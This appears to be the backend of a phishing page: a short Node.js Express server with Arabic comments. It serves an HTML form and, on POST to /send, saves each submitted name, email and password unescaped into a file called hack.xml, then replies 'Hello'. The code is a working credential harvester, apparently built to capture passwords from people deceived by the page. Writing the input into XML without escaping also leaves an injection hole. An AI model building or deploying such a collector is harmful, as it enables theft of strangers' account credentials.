const express = require("express");
const path = require("path");
const fs = require("fs");
const cheerio = require("cheerio");
const app = express();
const PORT = 3345;
const HOST = "localhost";
const src = path.join(__dirname, "./index.html");

// إجبار الخادم على قراءة وفهم بيانات نماذج الـ HTML القادمة عبر الـ POST
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    res.sendFile(src);
});

// تغيير المسار إلى POST ليتوافق مع نموذج الـ HTML
app.post("/send", (req, res) => {
    const hackSrc = path.join(__dirname, "./hack.xml"); 
    
    // قراءة ملف XML الحالي
    const file = fs.readFileSync(hackSrc, "utf-8");
    const $ = cheerio.load(file, { xmlMode: true }); // تفعيل وضع XML لضمان عدم تحويله لـ HTML
    
    // استخراج البيانات القادمة من المتصفح بشكل صحيح
    const { name, email, password } = req.body;
    
    // إضافة البيانات الجديدة داخل وسم <accounts>
    $("accounts").append(`
    <div>
        <name>${name}</name>
        <email>${email}</email>
        <password>${password}</password>
    </div>`);
    
    // خطوة جوهرية: حفظ التعديلات الجديدة بشكل دائم داخل ملف الـ XML
    fs.writeFileSync(hackSrc, $.xml(), "utf-8");
    
    return res.send("Hello");
});

app.listen(PORT, HOST, () => {
    console.log('server run in ' + `http://${HOST}:${PORT}`);
});
